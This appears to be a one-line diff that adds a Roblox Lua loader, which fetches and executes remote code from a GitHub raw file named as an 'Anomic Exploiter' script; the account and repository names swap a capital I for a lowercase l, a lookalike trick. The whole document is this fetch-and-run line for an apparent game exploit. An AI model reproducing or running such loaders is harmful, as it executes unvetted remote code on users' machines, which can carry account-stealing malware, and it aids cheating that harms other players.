@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalAnomicPIayer/40-Subscribers-SpeciaI/main/40%20Subscriber%20Special%20%7C%20YourLocalAnomicExploiter",true))();
